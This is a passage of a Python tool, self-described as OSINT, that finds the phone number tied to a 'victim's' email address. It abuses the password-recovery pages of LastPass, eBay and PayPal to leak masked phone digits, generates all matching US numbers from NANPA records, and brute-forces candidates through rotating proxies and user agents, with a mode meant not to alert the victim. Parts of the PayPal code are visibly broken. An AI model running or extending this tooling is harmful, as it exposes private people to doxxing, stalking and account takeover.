                                    "User-Agent": userAgent,
                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                    "Accept-Encoding": "gzip, deflate",
                                    "Accept-Language": "en-US,en;q=0.9",
                                    },
                           proxies=proxy,
                           verify=verifyProxy)

    csrfToken = re.search('<input type="hidden" name="token" value="(.+?)">', response.text).group(1)

    response = session.post("https://lastpass.com/recover.php",
                            headers={"Cache-Control": "max-age=0",
                                     "Origin": "https://lastpass.com",
                                     "Upgrade-Insecure-Requests": "1",
                                     "Content-Type": "application/x-www-form-urlencoded",
                                     "User-Agent": userAgent,
                                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                     "Referer": "https://lastpass.com/",
                                     "Accept-Encoding": "gzip, deflate",
                                     "Accept-Language": "en-US,en;q=0.9",
                                     },
                            data="cmd=sendemail" +
                                 "&token=" + csrfToken +
                                 "&username=" + email,
                            proxies=proxy,
                            verify=verifyProxy)

    last2 = ""
    regexOutput = re.search("We sent an SMS with a verification code to .*>(\+?)(.+([0-9]{2}))<\/strong>",
                            response.text)
    if regexOutput and regexOutput.group(3):
        last2 = regexOutput.group(3)
        print(GREEN + "Lastpass reports that the last 2 digits are: " + last2 + ENDC)

        if regexOutput.group(1):
            print(GREEN + "Lastpass reports a non US phone number" + ENDC)
            print(GREEN + "Lastpass reports that the length of the phone number (including country code) is " + str(len(regexOutput.group(2).replace("-", ""))) + " digits" + ENDC)
        else:
            print(GREEN + "Lastpass reports a US phone number" + ENDC)
            print(GREEN + "Lastpass reports that the length of the phone number (without country code) is " + str(
                len(regexOutput.group(2).replace("-", ""))) + " digits" + ENDC)
    else:
        print(YELLOW + "Lastpass did not report any digits" + ENDC)


def scrapeEbay(email):
    global userAgents
    global proxyList

    print("Scraping Ebay...")
    userAgent = random.choice(userAgents)
    proxy = random.choice(proxyList) if proxyList else None

    session = requests.Session()
    response = session.get(
        "https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&gchru=&clientapptype=19&rmvhdr=false",
        headers={"Upgrade-Insecure-Requests": "1",
                 "User-Agent": userAgent,
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                 "Accept-Encoding": "gzip, deflate",
                 "Accept-Language": "en-US,en;q=0.9",
                 },
        proxies=proxy,
        verify=verifyProxy)

    reqinput = ""
    regexOutput = re.search('value="(\w{60,})"', response.text)
    if regexOutput and regexOutput.group(1):
        reqinput = regexOutput.group(1)
    else:
        print(YELLOW + "Ebay did not report any digits" + ENDC)
        return

    response = session.post(
        "https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&gchru=&clientapptype=19&rmvhdr=false",
        headers={"Cache-Control": "max-age=0",
                 "Origin": "https://fyp.ebay.com",
                 "Upgrade-Insecure-Requests": "1",
                 "Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": userAgent,
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                 "Referer": "https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&clientapptype=19&signInUrl=https%3A%2F%2Fwww.ebay.com%2Fsignin%3Ffyp%3Dsgn%26siteid%3D0%26co_partnerId%3D0%26ru%3Dhttps%253A%252F%252Fwww.ebay.com%252F&otpFyp=1",
                 "Accept-Encoding": "gzip, deflate",
                 "Accept-Language": "en-US,en;q=0.9",
                 },
        data="ru=https%253A%252F%252Fwww.ebay.com%252F" +
             "&showSignInOTP=" +
             "&signInUrl=" +
             "&clientapptype=19" +
             "&reqinput=" + reqinput +
             "&rmvhdr=false" +
             "&gchru=&__HPAB_token_text__=" +
             "&__HPAB_token_string__=" +
             "&pageType=" +
             "&input=" + email,
        proxies=proxy,
        verify=verifyProxy)

    first1 = ""
    last2 = ""
    regexOutput = re.search("text you at ([0-9]{1})xx-xxx-xx([0-9]{2})", response.text)
    if regexOutput:
        if regexOutput.group(1):
            first1 = regexOutput.group(1)
            print(GREEN + "Ebay reports that the first digit is: " + first1 + ENDC)
        if regexOutput.group(2):
            last2 = regexOutput.group(2)
            print(GREEN + "Ebay reports that the last 2 digits are: " + last2 + ENDC)
    else:
        print(YELLOW + "Ebay did not report any digits" + ENDC)


def scrapePaypal(email):
    global userAgents
    global proxyList

    print("Scraping Paypal...")
    userAgent = random.choice(userAgents)
    proxy = random.choice(proxyList) if proxyList else None

    session = requests.Session()
    response = session.get("https://www.paypal.com/authflow/password-recovery/",
                           headers={"Upgrade-Insecure-Requests": "1",
                                    "User-Agent": userAgent,
                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                    "Accept-Encoding": "gzip, deflate",
                                    "Accept-Language": "en-US,en;q=0.9",
                                    },
                           proxies=proxy,
                           verify=verifyProxy)

    _csrf = ""
    regexOutput = re.search('"_csrf":"([a-zA-Z0-9+\/]+={0,3})"', response.text)
    if regexOutput and regexOutput.group(1):
        _csrf = regexOutput.group(1)
    else:
        print(YELLOW + "Paypal did not report any digits" + ENDC)
        return

    response = session.post("https://www.paypal.com/authflow/password-recovery",
                            headers={"Upgrade-Insecure-Requests": "1",
                                     "Origin": "https://www.paypal.com",
                                     "X-Requested-With": "XMLHttpRequest",
                                     "User-Agent": userAgent,
                                     "Accept": "*/*",
                                     "Referer": "https://www.paypal.com/authflow/password-recovery/",
                                     "Accept-Encoding": "gzip, deflate",
                                     "Accept-Language": "en-US,en;q=0.9",
                                     },
                            data="email=" + email +
                                 "&_csrf=" + _csrf,
                            proxies=proxy,
                            verify=verifyProxy)

    _csrf = _sessionID = jse = ""
    regexOutput = re.search('"_csrf":"([a-zA-Z0-9+\/]+={0,3})"', response.text)
    if regexOutput and regexOutput.group(1): _csrf = regexOutput.group(1)

    regexOutput = re.search('_sessionID" value="(\w+)"', response.text)
    if regexOutput and regexOutput.group(1): _sessionID = regexOutput.group(1)

    regexOutput = re.search('jse="(\w+)"', response.text)
    if regexOutput and regexOutput.group(1): jse = regexOutput.group(1)

    if not _csrf or not _sessionID or not jse:
        print(YELLOW + "Paypal did not report any digits" + ENDC)
        return

    response = session.post("https://www.paypal.com/auth/validatecaptcha",
                            headers={"Upgrade-Insecure-Requests": "1",
                                     "Origin": "https://www.paypal.com",
                                     "X-Requested-With": "XMLHttpRequest",
                                     "User-Agent": userAgent,
                                     "Content-Type": "application/x-www-form-urlencoded",
                                     "Accept": "*/*",
                                     "Referer": "https://www.paypal.com/authflow/password-recovery/",
                                     "Accept-Encoding": "gzip, deflate",
                                     "Accept-Language": "en-US,en;q=0.9",
                                     },
                            data="captcha=" +
                                 "&_csrf=" + _csrf +
                                 "&_sessionID=" + _sessionID +
                                 "&jse=" + jse +
                                 "&ads_token_js=b2c9ad327f5fa65af5a0a0a4cfa912d5cadf0f593027afffadd959390753d44d" +
                                 "&afbacc5007731416=2e21541bb2d5470b",  # TODO
                            proxies=proxy,
                            verify=verifyProxy)

    clientInstanceId = ""
    regexOutput = re.search('"clientInstanceId":"([a-zA-Z0-9-]+)"', response.text)
    if regexOutput and regexOutput.group(1):
        clientInstanceId = regexOutput.group(1)
    else:
        YELLOW + "Paypal did not report any digits" + ENDC
        return

    response = session.get("https://www.paypal.com/authflow/entry/?clientInstanceId=" + clientInstanceId,
                           headers={"Upgrade-Insecure-Requests": "1",
                                    "User-Agent": userAgent,
                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                    "Referer": "https://www.paypal.com/authflow/password-recovery/",
                                    "Accept-Encoding": "gzip, deflate",
                                    "Accept-Language": "en-US,en;q=0.9",
                                    },
                           proxies=proxyList,
                           verify=verifyProxy)

    lastDigits = ""
    regexOutput = re.search("Mobile <span.+((\d+)\W+(\d+))<\/span>", response.text)
    if regexOutput and regexOutput.group(3):
        last4 = regexOutput.group(3)
        print(GREEN + "Pyapal reports that the last " + len(regexOutput.group(3)) + " digits are: " + lastDigits + ENDC)

        if regexOutput.group(2):
            firstDigit = regexOutput.group(2)
            print(GREEN + "Paypal reports that the first digit is: " + regexOutput.group(2) + ENDC)

        if regexOutput.group(1):
            print(GREEN + "Paypal reports that the length of the phone number (without country code) is " + len(
                regexOutput.group(1)) + " digits" + ENDC)  # TODO: remove spaces

    else:
        print(YELLOW + "Paypal did not report any digits" + ENDC)


############ GENERATORS ############

# Returns all possible valid phone numbers according to NANPA based on a partial phone number
def getPossiblePhoneNumbers(maskedPhone):
    global poolingCache

    possiblePhoneNumbers = []
    nanpaFileUrl = "https://www.nationalnanpa.com/nanp1/allutlzd.zip"

    # Check if we need to download/update NANPA file
    if not os.path.exists("./allutlzd.zip") or (time.time() - os.path.getmtime("./allutlzd.zip")) > (24 * 60 * 60):
        print("NANPA file missing or needs to be updated. Downloading now...")
        response = requests.get(nanpaFileUrl)
        with open("allutlzd.zip", "wb") as code:
            code.write(response.content)
        print("NANPA file downloaded successfully")

    archive = zipfile.ZipFile('./allutlzd.zip', 'r')
    file = archive.read('allutlzd.txt')
    archive.close()

    assignedRegex = '\s[0-9A-Z\s]{4}\t.*\t[A-Z\-\s]+\t[0-9\\]*[\t\s]+AS'  # Only assigned area codes and exchanges
    areacodeExchangeRegex = re.sub("X", "[0-9]{1}",
                                   "(" + maskedPhone[:3] + "-" + maskedPhone[3:6] + ")")  # Area code + exchange
    possibleAreacodeExchanges = re.findall("([A-Z]{2})\s\t" + areacodeExchangeRegex + assignedRegex,
                                           file)  # Format: [state, areacode-exchange]

    remainingX = maskedPhone[7:].count("X")
    maskedPhoneFormatted = maskedPhone[7:].replace("X", "{}")
    for possibleAreacodeExchange in possibleAreacodeExchanges:
        state = possibleAreacodeExchange[0]
        areacode = possibleAreacodeExchange[1].split("-")[0]
        exchange = possibleAreacodeExchange[1].split("-")[1]

        if areacode not in poolingCache:
            cacheValidBlockNumbers(state, areacode)

        if maskedPhone[6] == 'X':  # Check for available block numbers for that area code and exchange
            if areacode in poolingCache and exchange in poolingCache[areacode]:
                blockNumbers = poolingCache[areacode][exchange]['blockNumbers']
            else:
                blockNumbers = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

        else:  # User provided blocknumber
            if areacode in poolingCache and exchange in poolingCache[areacode] and maskedPhone[6] not in \
                    poolingCache[areacode][exchange]['blockNumbers']:  # User provided invalid block number
                blockNumbers = []
            else:
                blockNumbers = [maskedPhone[6]]

        for blockNumber in blockNumbers:  # Add the rest of random subscriber number digits
            for x in product("0123456789", repeat=remainingX):
                possiblePhoneNumbers.append(areacode + exchange + blockNumber + maskedPhoneFormatted.format(*x))

    return possiblePhoneNumbers


def cacheValidBlockNumbers(state, areacode):
    global userAgents
    global proxyList
    global poolingCache

    proxy = random.choice(proxyList) if proxyList else None

    session = requests.Session()
    session.get(
        "https://www.nationalpooling.com/pas/blockReportSelect.do?reloadModel=N")  # We need the cookies or it will error
    response = session.post("https://www.nationalpooling.com/pas/blockReportDisplay.do",
                            headers={"Upgrade-Insecure-Requests": "1",
                                     "User-Agent": random.choice(userAgents),
                                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                     "Referer": "https://www.nationalpooling.com/pas/blockReportSelect.do?reloadModel=Y",
                                     "Accept-Encoding": "gzip, deflate, br",
                                     "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
                                     "Origin": "https://www.nationalpooling.com",
                                     "Content-Type": "application/x-www-form-urlencoded",
                                     "DNT": "1"
                                     },
                            data="stateAbbr=" + state +
                                 "&npaId=" + areacode +
                                 "&rtCntrId=" + "ALL" +
                                 "&reportType=" + "3",
                            proxies=proxy,
                            verify=verifyProxy)

    soup = BeautifulSoup(response.text, 'html.parser')
    availableBlockNumbers = []
    areacodeCells = soup.select("form table td:nth-of-type(1)")
    for areaCodeCell in areacodeCells:
        if areaCodeCell.string and areaCodeCell.string.strip() == areacode:
            exchange = areaCodeCell.next_sibling.next_sibling.string.strip()
            blockNumber = areaCodeCell.next_sibling.next_sibling.next_sibling.next_sibling.string.strip()

            if areacode not in poolingCache:
                poolingCache[areacode] = {}
                poolingCache[areacode][exchange] = {}
                poolingCache[areacode][exchange]['blockNumbers'] = []
            elif exchange not in poolingCache[areacode]:
                poolingCache[areacode][exchange] = {}
                poolingCache[areacode][exchange]['blockNumbers'] = []

            poolingCache[areacode][exchange]['blockNumbers'].append(
                blockNumber)  # Temporarely we store the invalid blocknumbers

    for areacode in poolingCache:  # Let's switch invalid blocknumbers for valid ones
        for exchange in poolingCache[areacode]:
            poolingCache[areacode][exchange]['blockNumbers'] = [n for n in
                                                                ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"] if
                                                                n not in poolingCache[areacode][exchange][
                                                                    'blockNumbers']]


def setProxyList():
    global proxyList

    f = open(args.proxies, "r")
    if not f.mode == 'r':
        f.close()
        exit(RED + "Could not read file " + args.proxies + ENDC)

    fileContent = f.read()
    fileContent = filter(None, fileContent)  # Remove last \n if needed
    proxyListUnformatted = fileContent.split("\n")
    f.close()

    for proxyUnformatted in proxyListUnformatted:
        separatorPosition = proxyUnformatted.find("://")
        proxyList.append({proxyUnformatted[:separatorPosition]: proxyUnformatted[separatorPosition + 3:]})


def parse_arguments():
    parser = argparse.ArgumentParser(description='An OSINT tool to find phone numbers associated to email addresses')
    subparsers = parser.add_subparsers(help='commands', dest='action')
    subparsers.required = True  # python3 compatibility, will generate slightly different error massage then python2
    scrape_parser = subparsers.add_parser(Actions.SCRAPE, help='scrape online services for phone number digits')
    scrape_parser.add_argument("-e", required=True, metavar="EMAIL", dest="email", help="victim's email address")
    scrape_parser.add_argument("-p", metavar="PROXYLIST", dest="proxies",
                               help="a file with a list of https proxies to use. Format: https://127.0.0.1:8080")
    scrape_parser.add_argument("-q", dest="quiet", action="store_true",
                               help="scrape services that do not alert the victim")
    generator_parser = subparsers.add_parser(Actions.GENERATE,
                                             help="generate all valid phone numbers based on NANPA's public records")
    generator_parser.add_argument("-m", required=True, metavar="MASK", dest="mask",
                                  help="a masked 10-digit US phone number as in: 555XXX1234")
    generator_parser.add_argument("-o", metavar="FILE", dest="file", help="outputs the list to a dictionary")
    generator_parser.add_argument("-q", dest="quiet", action="store_true",
                                  help="use services that do not alert the victim")
    generator_parser.add_argument("-p", metavar="PROXYLIST", dest="proxies",
                                  help="a file with a list of https proxies to use. Format: https://127.0.0.1:8080")
    bruteforce_parser = subparsers.add_parser(Actions.BRUTE_FORCE,
                                              help='bruteforce using online services to find the phone number')
    bruteforce_parser.add_argument("-e", required=True, metavar="EMAIL", dest="email", help="victim's email address")
    bruteforce_parser.add_argument("-m", metavar="MASK", dest="mask",
                                   help="a masked, 10-digit US phone number as in: 555XXX1234")
    bruteforce_parser.add_argument("-d", metavar="DICTIONARY", dest="file", help="a file with a list of numbers to try")
    bruteforce_parser.add_argument("-p", metavar="PROXYLIST", dest="proxies",
                                   help="a file with a list of HTTPS proxies to use. Format: https://127.0.0.1:8080")
    bruteforce_parser.add_argument("-q", dest="quiet", action="store_true",
                                   help="use services that do not alert the victim")
    bruteforce_parser.add_argument("-v", dest="verbose", action="store_true", help="verbose output")
    return parser.parse_args()


def generate(args):
    if not re.match("^[0-9X]{10}", args.mask):
        exit(RED + "You need to pass a US phone number masked as in: 555XXX1234" + ENDC)
    possiblePhoneNumbers = getPossiblePhoneNumbers(args.mask)
    if args.file:
        with open(args.file, 'w') as f:
            f.write('\n'.join(possiblePhoneNumbers))
        print(GREEN + "Dictionary created successfully at " + os.path.realpath(f.name) + ENDC)
        f.close()

    else:
        print(GREEN + "There are " + str(len(possiblePhoneNumbers)) + " possible numbers" + ENDC)
        print(GREEN + str(possiblePhoneNumbers) + ENDC)


def brutforce(args):
    if args.email and not re.match(r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)", args.email):
        exit(RED + "Email is invalid" + ENDC)
    if (args.mask and args.file) or (not args.mask and not args.file):
        exit(RED + "You need to provide a masked number or a file with numbers to try" + ENDC)
    if args.mask and not re.match("^[0-9X]{10}", args.mask): exit(
        RED + "You need to pass a 10-digit US phone number masked as in: 555XXX1234" + ENDC)
    if args.file and not os.path.isfile(args.file): exit(RED + "You need to pass a valid file path" + ENDC)
    print("Looking for the phone number associated to " + args.email + "...")
    if args.mask:
        possiblePhoneNumbers = getPossiblePhoneNumbers(args.mask)
    else:
        f = open(args.file, "r")
        if not f.mode == 'r':
            f.close()
            exit(RED + "Could not read file " + args.file + ENDC)
        fileContent = f.read()
        fileContent = filter(None, fileContent)  # Remove last \n if needed
        possiblePhoneNumbers = fileContent.split("\n")
        f.close()
    startBruteforcing(possiblePhoneNumbers, args.email, args.quiet, args.verbose)


if __name__ == '__main__':
    args = parse_arguments()
    if args.proxies:
        setProxyList()

    if args.action == Actions.SCRAPE:
        startScraping(args.email, args.quiet)
    elif args.action == Actions.GENERATE:
        generate(args)
    elif args.action == Actions.BRUTE_FORCE:
        brutforce(args)
    else:
        exit(RED + "action not recognized" + ENDC)
